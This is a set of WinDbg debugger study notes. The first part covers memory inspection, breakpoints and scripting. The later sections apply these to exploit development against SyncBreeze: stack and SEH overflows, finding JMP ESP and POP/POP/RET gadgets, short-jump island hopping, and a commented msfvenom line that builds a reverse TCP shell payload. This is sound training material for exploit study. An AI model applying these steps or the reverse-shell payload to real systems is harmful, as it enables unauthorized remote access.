# Unassemble from Memory
u kernel32!GetCurrentThread

# display bytes 
db esp

db 00faf974  or symbol names kernel32!WriteFile

# to display data in a larger size format dw (word => 2 bytes)
dw esp

# to display data in a larger size format dd (dword => 4 bytes)
dd esp

# We can display QWORDs (eight bytes) with dq 
dq esp

# Display ASCII character dc or dW (cap W)
dc esp
dc kernelbase+0x40
dW kernelbase+0x40
dW esp

# The default length when displaying data is 0x80 bytes. We can change this value by using the L parameter with display commands
dd esp L4
dd esp L10
dds esp L10 (the s at the end will show data vertically)
dds esp -10 L8


## WinDbg allows us to display the memory content at a specified address as either ASCII format using the da command or Unicode format using the du command.

## We can also display data through the pointer to data command poi , which displays data referenced from a memory address. In the listing below, the display DWORD command dd is used twice to emulate a memory dereference.

Ex: dd esp L1 (gives 771bab89)
dd 771bab89

this two commands can be summarize at 
dd poi(esp)

## The Display Type dt command takes the name of the structure to display as an argument and, optionally, a memory address from which to dump the structure data 
`dt ntdll!_TEB`

### By supplying the - r flag to the dt command, WinDbg will recursively display nested structures where present.
`dt -r ntdll!_TEB @$teb`


### We can also display specific fields in the structure by passing the name of the field as an additional parameter. The following is an example for the TEB ThreadLocalStoragePointer field 
`dt ntdll!_TEB @$tebThreadLocalStoragePointer`

### WinDbg can also display the size of a structure extracted from a symbol file. This is because some Windows APIs will take a structure as an argument, so we need to be able to determine the size of a certain structure. To get this info, we use the WinDbg sizeof command
`?? sizeof(ntdll!_TEB)`

# Writing to memory
The main WinDbg command for this job is e\* , the edit command. The same size modifiers used for the display command also apply to the edit command. Below is an example showing

```
dd esp L1
ed esp 41414141
dd esp L1
```
As with the display command, we can directly write or modify ASCII characters using ea or unicode characters using eu

```
da esp
ea esp "Hello"
da esp
```

# Searching the memory space
To perform a search we need s and four additional parameters: the memory type to search for, the starting point of memory to search, the length of memory to search, and the pattern to search for. 
When searching for the memory type DWORD, we use -d . Next, we set the searching address, which starts at 0. We then set the length for the command to search. To search the whole memory range, we enter L and the value “?80000000”, which signifies the entire process’s memory space (more on the “?” keyword shortly). Finally, we enter the pattern that we want to search for, in this case, 41414141.

```
ed esp 41414141
s -d 0 L?80000000 41414141
```

## perform a search of the entire user process memory space for a well-known ASCII string.
`s -a 0 L?80000000 " This program cannot be run in DOS mode"`

# Inspecting and Editing CPU Registers in WinDbg
we show how to dump all registers as well as a single one by using the r command
```
r
r ecx
#We can also modify ECX with r ecx= followed by the new register value.
r ecx=41414141
r
```
# Controlling the Program Execution in WinDbg
## Software Breakpoints
We start by using bp along with the location where we want the application to stop, which in this case is the kernel32!WriteFile function.
```
bp kernel32!WriteFile
bl (list breakpoint)
```
After setting up the desired breakpoints, we have to let the execution continue by issuing the g
`g`

During a debugging session, it can also be handy to disable and enable breakpoints using the bd (disable) and be (enable) commands, respectively. 
```
bd 0
bl
be 0
bl
```
We can clear breakpoints using the bc command
```
bl
bc 0
bl
```

### Temporarily disable access violation in WinDbg
Avoid stopping the execution for every “first time” exception
`sxd av`
Disable guard pages
`sxd gp`

### Unresolved Function Breakpoint
We can use the bu command to set a breakpoint on an unresolved function. This is a function residing in a module that isn’t yet loaded in the process memory space. In this case, the breakpoint will be enabled when the module is loaded and the target function is resolved.

The module OLE32.dll is not initially loaded in the notepad.exe process, but is loaded once a file is saved. Once WinDbg is attached to the notepad.exe process, we will set an unresolved breakpoint on a arbitrary OLE32 function, OLE32!WriteStringStream
```
lm m ole32
bu ole32!WriteStringStream	
```

### Breakpoint-Based Actions
We can also automate the execution of commands within the debugger when a breakpoint is triggered. This enables us to print the register’s content, dereference memory locations, and perform other powerful actions when a breakpoint is hit
```
bp kernel32!WriteFile ".printf \"The number of bytes written is : %p\", poi(esp + 0x0C);.echo;g"
```

Another powerful feature of WinDbg is the ability to set conditional breakpoints. As the name suggests, conditional breakpoints break the execution flow only if a specific condition is satisfied.

In the following example, we are going to use the .if and .else commands to set a conditional breakpoint on the kernel32!WriteFile Windows API again. In this example, we will halt the execution flow only if we write exactly four bytes of data to a file from Notepad. We can accomplish this with the following syntax:

```
bp kernel32!WriteFile ".if(poi(esp+0x0C)!=4) {gc} .else {.printf\"The number of bytes written is 4\";.echo;}"
```
When our breakpoint on WriteFile is triggered, we use gc (go from conditional breakpoint) to resume execution, unless the nNumberOfBytesToWrite argument (third argument on the stack) is equal to “4”.


## Hardware Breakpoints
To set a hardware breakpoint in WinDbg, we need to pass three arguments to the ba command. The first is the type of access, which can be either e (execute), r (read), or w (write). The second one is the size in bytes for the specified memory access, and finally, the third argument is the memory address where we want to set the breakpoint at. 

In the next example, we are going to set a hardware breakpoint on the execution of the WriteFile API. The outcome is equivalent to setting a software breakpoint, but in this case, we leverage the CPU and the debug registers, rather than altering the code with an INT 3 instruction.

```
ba e 1 kernel32!WriteFile
g
```
In the next example, we are going to write a string in Notepad and search for that string in memory with the help of the debugger. Once we find our data in memory, we’ll set a hardware breakpoint on write access at the memory address where our string is located. We’ll then resume program execution and attempt to change our string from within Notepad. At this point, we expect our breakpoint to be triggered since the program will attempt to access our string in memory to change it.

The first step is to write our string in Notepad. We’ll use a string (“w00tw00t”) that hopefully should not already be in the notepad.exe memory space, as ideally we want our search to return a single result. Then, we’ll save the file, close the Notepad application, and re-open the text file by double- clicking it. We will then attach WinDbg to the Notepad process, which will halt the execution.


We then proceed to search the entire memory space of the application for our unique string within WinDbg. We’ll search for both ASCII ( s - a ) and Unicode ( s - u ) strings, as shown below:
```
s -a 0 L?80000000 w00tw00t
s -u 0 L?80000000 w00tw00t
```
In this case, the result would have been saved in unicode format, so s -u will work instead of s -a. Asuming the address found is 005e7c48

We will set a hardware breakpoint on the memory address found by our search. Specifically, we will set a breakpoint on write access at the first two bytes of our Unicode string (0x00 and 0x77 at address 0x005e7c48).

```
ba w 2 005e7c48
bl
g
```

Now that the breakpoint is set and the execution is resumed, let’s test it by selecting the entire string in Notepad and replacing it with a single lowercase case “a” character.

The previous instruction can be found in the WinDbg disassembly window. The instruction that triggered our hardware breakpoint was "mov byte ptr [edi],al", part of the memmove function located in msvcrt.dll.

Notice how the EDI register points to our Unicode string
```
du edi
bc *
g
```

## Stepping Through the Code
After halting the application flow, we can use p and t to step over, and into each instruction, respectively

Another convenient command is pt (step to next return), which allows us to fast-forward to the end of a function.

Like the p t command, ph executes code until a branching instruction is reached. This includes conditional or unconditional branches, function calls, and return instructions.

# Additional WinDbg Features
## Listing Modules and Symbols in WinDbg
We can issue the lm command to display all loaded modules, including their starting and ending addresses in virtual memory space.
When we execute the command against a freshly opened instance of Notepad, no symbols are loaded. However, we can force a reload of the symbols with `.reload / f` and then relist the
modules
```
lm 
.reload /f
lm

#filter module
lm m kernel*
```

Once we have the list of modules, we can learn more about their symbols by using the `x` (examining symbol) command. In the following example, we dump information regarding the symbols present from the KERNELBASE module. Notice how we use the wildcard to display all the symbols that start with “CreateProc”:

```
x kernelbase!CreateProc*
```

## Using WinDbg as a Calculator
Mathematical calculations are performed by the evaluate expression command, ? .
```
? 77269bc0 - 77231430
? 77269bc0 >> 18
```
### Data Output Format
we can convert the hex representation to decimal or binary format with the 0n and 0y prefixes respectively
```
? 41414141
? 0n41414141
? 0y1110100110111
```

The .formats command is also useful for converting between different formats at once, including the ASCII representation of the value
```
.formats 41414141
```

### Pseudo Registers
There are 20 user-defined pseudo registers named $t0 to $t19 that can be used as variables during mathematical calculations. We can also perform calculations by directly using these pseudo registers together with explicit values.

Sometimes we have to perform complicated calculations when reverse engineering or developing an exploit. A somewhat complicated fictitious calculation
`? ((41414141 - 414141) * 0n10) >> 8`

The same calculation can be performed with a pseudo register. Here we use the $t0 pseudo register and store the value of the first calculation. Then we read the $t0 register and WinDbg outputs the result to verify the value. Finally, we right-shift $t0 by 8 bits to get the final result. This process is shown as below:
```
r @$t0 = (41414141 - 414141) * 0n10
r @$t0
? @$t0 >> 8
```

# Syncbreeze overflow
```
msf-pattern_create -l 800
msf-pattern_offset -l 800 -q 42306142


dds esp L4
dds esp+2c0 L4

? 00567724 - 0056745c

lm m libspp

s -b module_start_address module_end_address 0xff 0xe4
s -b 10000000 10223000 0xff 0xe4
#10090c83
u 10090c83

bp 10090c83
bl

t # step over


#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.1 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

## SEH
WinDbg allows us to automatically list the current thread exception handler chain with !exchain. The !exchain extension displays the exception handlers of the current thread.
```
!exchain
```
To inspect the callstack ( k ) to determine which functions were called before the EIP register was overwritten.
```
k
```

bp ntdll!ExecuteHandler2
u @eip L11

### Finding a P/P/R Instruction Sequence
```
.load narly
!nmod

#scripting
# should be placed in a ".wds" file (ex C:\Users\vagrant\Desktop\find_ppr.wds)
#here 10000000 and 10226000 are start and end address of the module we want to check for P/P/R instruction

.block
{
    .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
    {
        .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
        {
            s-[1]b 10000000 10226000 $t0 $t1 c3
        }
    }
}
```

`$><C:\Users\vagrant\Desktop\find_ppr.wds`

`bp 0x1015a2f0`

### Island-Hopping in Assembly
To assemble an instruction that will jump over the current SEH and redirect us into our fake shellcode located after the P/P/R address. This is known as a “short jump” in assembly.

The first opcode of a short jump is always 0xEB and the second opcode is the relative offset, which ranges from 0x00 to 0x7F for forward short jumps,and from 0x80 to 0xFF for backwards short jumps.

After single-stepping through the P/P/R instructions, we will use the `a` command to assemble the short jump and obtain its opcodes:
```
dds eip L4
a
jmp 0x018fffc5 # 0x018fffc5 being address where we want to jump in

u eip L1
dds eip L4
```

### Perform a search for the NOP instructions followed by the bytes contained in our shellcode variable right after taking our short jump
```
!teb
#we take the StackLimit and the StackBase

s -b 01b5e000 01b60000 90 90 90 90 43 43 43 43 43 43 43 43
s -b 01b5e000 01b60000 44 44 44 44 45 45 45 45 45 45 45 45

#here 01b5e000 and 01b60000 are respectively the StackLimit and the StackBase
```

#Our next step is to determine the offset from our current stack pointer to the beginning of our shellcode. This will allow us to use the limited space we currently have to assemble a set of instructions that will allow us to “island hop”, redirecting execution to our shellcode.

To determine this, we can simply use ? to subtract between the memory address of the start of our shellcode (0x01b5fa98) and the current value of the stack pointer.
```
? 0x01b5fa98 - @esp 

#here the offset is 1608 (00000648) 
```

In order to reach this part of the shellcode we have 3 possibility but **we should make sure the one used doesn't content bad characters or null bytes in the opcodes**
1. add esp
```
msf-nasm_shell
add esp , 0x648
```
2. use smaller jumps (of less than 0x7F ) until we reach the desired offset.

3. reference the SP register in our assembly instruction to do arithmetic operations on the lower 16 bits
```
msf-nasm_shell
add sp , 0x648
jmp esp
```